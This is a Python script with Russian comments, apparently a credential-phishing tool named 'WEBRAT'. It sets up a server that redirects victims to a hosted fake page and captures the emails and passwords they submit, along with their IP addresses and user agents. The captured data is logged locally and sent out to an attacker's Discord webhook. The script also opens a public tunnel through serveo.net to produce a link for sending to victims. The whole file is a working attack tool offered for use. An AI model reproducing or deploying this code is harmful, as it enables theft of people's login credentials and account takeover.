#!/usr/bin/env python3
# WEBRAT by @DADILK - ИНТЕГРАЦИЯ С ССЫЛКОЙ
# ДЛЯ ISH - КРАДЕТ ПОЧТУ И ПАРОЛЬ

import http.server
import socketserver
import json
import datetime
import threading
import time
import subprocess
import os
import random
import string
import sys
import requests
import urllib.parse

# ============================================
# ТВОЯ ГОТОВАЯ ССЫЛКА НА ЗАРАЖЕНКУ
# ============================================
WEBRAT_URL = "https://liberiumoffc.github.io/-3/"

# ============================================
# ФАЙЛЫ ДЛЯ СОХРАНЕНИЯ
# ============================================
CONFIG_FILE = '/sdcard/webrat_config.json'
LOG_FILE = '/sdcard/webrat_logs.txt'

# ============================================
# ЦВЕТА ДЛЯ ТЕРМИНАЛА
# ============================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    WHITE = '\033[97m'
    BLACK = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'

# ============================================
# ФУНКЦИЯ ОЧИСТКИ ЭКРАНА
# ============================================
def clear_screen():
    """Очищает экран терминала"""
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================
# АНИМАЦИИ
# ============================================
def loading_animation(text, duration=1):
    """Анимация загрузки"""
    animation = "|/-\\"
    for i in range(20):
        time.sleep(duration/20)
        sys.stdout.write(f"\r{Colors.CYAN}{text} {animation[i % len(animation)]}{Colors.END}")
        sys.stdout.flush()
    print()

def pulse_animation(text, duration=2):
    """Пульсирующая анимация"""
    for _ in range(10):
        for brightness in range(0, 100, 10):
            sys.stdout.write(f"\r\033[38;5;{brightness+20}m{text}\033[0m")
            sys.stdout.flush()
            time.sleep(duration/20)
    print()

# ============================================
# ЗАГРУЗКА/СОХРАНЕНИЕ НАСТРОЕК
# ============================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {"webhook": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

# ============================================
# КРАСИВЫЙ БАННЕР
# ============================================
def print_banner():
    """Красивый баннер при запуске"""
    clear_screen()
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════╗
{Colors.RED}║{Colors.YELLOW}  █     █░ ███████ ██████  ██████   █████  ████████ {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ██   ██░ ██      ██   ██ ██   ██ ██   ██    ██    {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ██   ██░ █████   ██████  ██████  ███████    ██    {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ██   ██░ ██      ██   ██ ██   ██ ██   ██    ██    {Colors.RED}║
{Colors.RED}║{Colors.YELLOW}  ███████░ ███████ ██████  ██   ██ ██   ██    ██    {Colors.RED}║
{Colors.RED}╠══════════════════════════════════════════════════════════╣
{Colors.RED}║{Colors.CYAN}              by @DADILK - PREMIUM VERSION           {Colors.RED}║
{Colors.RED}║{Colors.GREEN}         Профессиональный фишинг инструмент          {Colors.RED}║
{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)
    pulse_animation("🔥 WEBRAT PREMIUM 🔥", 1)
    time.sleep(1)

# ============================================
# HTTP HANDLER
# ============================================
class WebRatHandler(http.server.SimpleHTTPRequestHandler):
    webhook_url = ""
    
    def do_GET(self):
        if self.path == '/':
            # Перенаправляем на готовую страницу
            self.send_response(302)
            self.send_header('Location', WEBRAT_URL)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode('utf-8'))
        
        # Добавляем IP
        data['ip'] = self.client_address[0]
        data['timestamp'] = str(datetime.datetime.now())
        
        # Определяем тип действия
        if self.path == '/login':
            self.handle_login(data)
        elif self.path == '/register':
            self.handle_register(data)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def handle_login(self, data):
        """Обработка попытки входа"""
        print(f"\n{Colors.RED}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.RED}║{Colors.YELLOW}                    🔴 ПОПЫТКА ВХОДА                      {Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 📧 Email: {data['email']}{' ' * (40 - len(data['email']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🔑 Пароль: {data['password']}{' ' * (38 - len(data['password']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🌐 IP: {data['ip']}{' ' * (43 - len(data['ip']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}║{Colors.CYAN} 🕐 Время: {data['timestamp']}{' ' * (37 - len(data['timestamp']))}{Colors.RED}║{Colors.END}")
        print(f"{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Сохраняем в файл
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Отправляем в Discord
        if self.webhook_url:
            self.send_to_discord(data, "🔴 ПОПЫТКА ВХОДА")
    
    def handle_register(self, data):
        """Обработка регистрации"""
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.YELLOW}                   🟢 НОВАЯ РЕГИСТРАЦИЯ                   {Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 📧 Email: {data['email']}{' ' * (40 - len(data['email']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 🔑 Пароль: {data['password']}{' ' * (38 - len(data['password']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 🌐 IP: {data['ip']}{' ' * (43 - len(data['ip']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}║{Colors.CYAN} 🕐 Время: {data['timestamp']}{' ' * (37 - len(data['timestamp']))}{Colors.GREEN}║{Colors.END}")
        print(f"{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        # Сохраняем в файл
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(data) + '\n')
        
        # Отправляем в Discord
        if self.webhook_url:
            self.send_to_discord(data, "🟢 НОВАЯ РЕГИСТРАЦИЯ")
    
    def send_to_discord(self, data, action):
        """Отправка в Discord Webhook"""
        try:
            # Формируем сообщение
            if "ВХОДА" in action:
                color = 15548997  # красный
                fields = [
                    {"name": "📧 Email", "value": f"```{data['email']}```", "inline": False},
                    {"name": "🔑 Пароль", "value": f"```{data['password']}```", "inline": False}
                ]
            else:  # регистрация
                color = 5763719  # зеленый
                fields = [
                    {"name": "📧 Email", "value": f"```{data['email']}```", "inline": False},
                    {"name": "🔑 Пароль", "value": f"```{data['password']}```", "inline": False}
                ]
            
            # Добавляем общие поля
            fields.extend([
                {"name": "🌐 IP Адрес", "value": f"```{data['ip']}```", "inline": True},
                {"name": "🕐 Время", "value": f"```{data['timestamp']}```", "inline": True},
                {"name": "📱 User Agent", "value": f"```{data.get('userAgent', 'N/A')[:100]}...```", "inline": False}
            ])
            
            webhook_data = {
                "embeds": [{
                    "title": f"🔥 WEBRAT by @DADILK - {action}",
                    "color": color,
                    "fields": fields,
                    "footer": {"text": f"WEBRAT v3.0 | {data['ip']}"}
                }]
            }
            
            response = requests.post(self.webhook_url, json=webhook_data)
            if response.status_code == 204:
                print(f"{Colors.GREEN}✅ Отправлено в Discord{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Ошибка отправки: {response.status_code}{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}❌ Ошибка отправки в Discord: {e}{Colors.END}")

# ============================================
# ФУНКЦИИ ДЛЯ РАБОТЫ
# ============================================
def get_local_ip():
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if 'inet ' in line and '127.0.0.1' not in line:
                return line.split()[1]
    except:
        pass
    return '127.0.0.1'

def create_public_url(port):
    """Создает публичную ссылку через serveo.net"""
    try:
        subdomain = f"webrat-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        cmd = f"ssh -R {subdomain}:80:localhost:{port} serveo.net"
        
        # Запускаем в фоне
        process = subprocess.Popen(
            cmd.split(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        time.sleep(3)
        public_url = f"https://{subdomain}.serveo.net"
        return public_url
    except:
        return None

def view_logs():
    """Просмотр сохраненных данных"""
    if not os.path.exists(LOG_FILE):
        print(f"{Colors.RED}❌ Логов пока нет{Colors.END}")
        return
    
    with open(LOG_FILE, 'r') as f:
        logs = f.readlines()
    
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}              📁 WEBRAT LOGS ({len(logs)} записей)              {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
    
    for i, log in enumerate(logs[-20:], 1):
        try:
            data = json.loads(log)
            if data.get('type') == 'register':
                print(f"\n{Colors.GREEN}{i}. 🟢 РЕГИСТРАЦИЯ{Colors.END}")
                print(f"   {Colors.CYAN}📧 {data.get('email', 'N/A')}{Colors.END}")
                print(f"   {Colors.CYAN}🔑 {data.get('password', 'N/A')}{Colors.END}")
            else:
                print(f"\n{Colors.RED}{i}. 🔴 ВХОД{Colors.END}")
                print(f"   {Colors.CYAN}📧 {data.get('email', 'N/A')}{Colors.END}")
                print(f"   {Colors.CYAN}🔑 {data.get('password', 'N/A')}{Colors.END}")
            print(f"   {Colors.CYAN}🌐 {data.get('ip', 'N/A')}{Colors.END}")
            print(f"   {Colors.CYAN}🕐 {data.get('timestamp', 'N/A')}{Colors.END}")
            print(f"{Colors.YELLOW}{'-'*50}{Colors.END}")
        except:
            print(f"\n{i}. {log}")
    
    input(f"\n{Colors.CYAN}Нажми Enter чтобы продолжить...{Colors.END}")

def main_menu():
    """Главное меню"""
    config = load_config()
    
    while True:
        clear_screen()
        print_banner()
        
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.YELLOW}                         МЕНЮ                           {Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╠══════════════════════════════════════════════════════════╣{Colors.END}")
        webhook_status = f"{Colors.GREEN}✅ Настроен{Colors.END}" if config['webhook'] else f"{Colors.RED}❌ Не настроен{Colors.END}"
        print(f"{Colors.CYAN}║{Colors.WHITE} 1. Настройка Discord Webhook {webhook_status:>30}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 2. Запустить локальный сервер{' ' * 40}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 3. Запустить с публичной ссылкой{' ' * 36}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 4. Просмотр сохраненных данных{' ' * 35}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 5. Очистить все данные{' ' * 42}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}║{Colors.WHITE} 0. Выход{' ' * 55}{Colors.CYAN}║{Colors.END}")
        print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        
        choice = input(f"{Colors.YELLOW}Выберите действие (0-5): {Colors.END}").strip()
        
        if choice == "1":
            clear_screen()
            print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}║{Colors.YELLOW}                 НАСТРОЙКА WEBHOOK                   {Colors.CYAN}║{Colors.END}")
            print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
            webhook = input(f"{Colors.GREEN}Введите Discord Webhook URL: {Colors.END}").strip()
            if webhook:
                config['webhook'] = webhook
                save_config(config)
                print(f"{Colors.GREEN}✅ Webhook сохранен!{Colors.END}")
                time.sleep(1)
        
        elif choice == "2":
            if not config['webhook']:
                print(f"{Colors.RED}❌ Сначала настройте webhook!{Colors.END}")
                time.sleep(1)
                continue
            start_server(config, public=False)
        
        elif choice == "3":
            if not config['webhook']:
                print(f"{Colors.RED}❌ Сначала настройте webhook!{Colors.END}")
                time.sleep(1)
                continue
            start_server(config, public=True)
        
        elif choice == "4":
            view_logs()
        
        elif choice == "5":
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print(f"{Colors.GREEN}✅ Данные очищены{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Нет данных для очистки{Colors.END}")
            time.sleep(1)
        
        elif choice == "0":
            print(f"{Colors.YELLOW}Выход...{Colors.END}")
            loading_animation("Завершение работы", 1)
            sys.exit(0)

def start_server(config, public=False):
    """Запуск сервера"""
    PORT = 8080
    
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.YELLOW}                 ЗАПУСК WEBRAT СЕРВЕРА                 {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
    
    loading_animation("Запуск сервера", 1)
    
    # Устанавливаем webhook
    WebRatHandler.webhook_url = config['webhook']
    
    # Получаем локальный IP
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    
    print(f"\n{Colors.GREEN}📌 Твоя готовая страница: {Colors.CYAN}{WEBRAT_URL}{Colors.END}")
    print(f"{Colors.GREEN}📌 Локальная ссылка (перенаправляет): {Colors.CYAN}{local_url}{Colors.END}")
    print(f"{Colors.GREEN}📌 Локальный хост: {Colors.CYAN}http://localhost:{PORT}{Colors.END}")
    
    if public:
        print(f"\n{Colors.YELLOW}🔄 Создание публичной ссылки...{Colors.END}")
        public_url = create_public_url(PORT)
        
        if public_url:
            print(f"{Colors.GREEN}✅ Публичная ссылка (перенаправляет): {Colors.CYAN}{public_url}{Colors.END}")
            print(f"\n{Colors.YELLOW}📎 Отправьте жертве: {Colors.CYAN}{public_url}{Colors.END}")
            print(f"{Colors.YELLOW}   (перенаправит на твою страницу: {WEBRAT_URL}){Colors.END}")
            
            # Отправляем ссылку в Discord
            try:
                webhook_data = {
                    "content": f"**🔥 WEBRAT by @DADILK - ССЫЛКА ГОТОВА**\n\n{public_url}\n\nПеренаправляет на: {WEBRAT_URL}"
                }
                requests.post(config['webhook'], json=webhook_data)
                print(f"{Colors.GREEN}✅ Ссылка отправлена в Discord{Colors.END}")
            except:
                pass
        else:
            print(f"{Colors.RED}❌ Не удалось создать публичную ссылку{Colors.END}")
            print(f"{Colors.YELLOW}📌 Используй локальную ссылку: {local_url}{Colors.END}")
    
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.GREEN}              ⏳ WEBRAT ЗАПУЩЕН                     {Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.WHITE} 📁 Логи: {LOG_FILE}{' ' * (35 - len(LOG_FILE))}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}║{Colors.WHITE} 🔴 Ожидание данных...{' ' * 41}{Colors.CYAN}║{Colors.END}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════╝{Colors.END}\n")
    
    # Запускаем сервер
    handler = WebRatHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}❌ Сервер остановлен{Colors.END}")
            httpd.shutdown()
            time.sleep(1)

# ============================================
# ЗАПУСК
# ============================================
if __name__ == '__main__':
    # Создаем папку для логов
    os.makedirs('/sdcard', exist_ok=True)
    
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Выход...{Colors.END}")
        sys.exit(0)
